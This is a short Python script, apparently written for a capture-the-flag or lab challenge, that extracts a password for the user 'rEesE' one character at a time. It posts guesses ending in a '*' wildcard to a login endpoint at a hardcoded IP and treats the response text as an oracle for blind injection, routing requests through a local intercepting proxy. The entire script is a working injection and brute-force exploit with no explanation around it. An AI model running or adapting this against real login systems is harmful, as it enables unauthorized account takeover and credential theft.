import requests
import string

url = 'http://139.59.181.145:31507/login'
#all_chars = string.ascii_letters + string.digits + string.punctuation
#all_chars.replace('*','')
all_chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!"#$%&()+,-./:;<=>?@[\]^_`{|}~'
print(all_chars)
password = ''

while(True):
    for i in all_chars:
        test = password + i 
        response = requests.post(url, data={'username':'rEesE','password':test+'*'},proxies ={"http":"http://127.0.0.1:8080"})
        if('No search results' in response.text):
            password = test
            print(password)
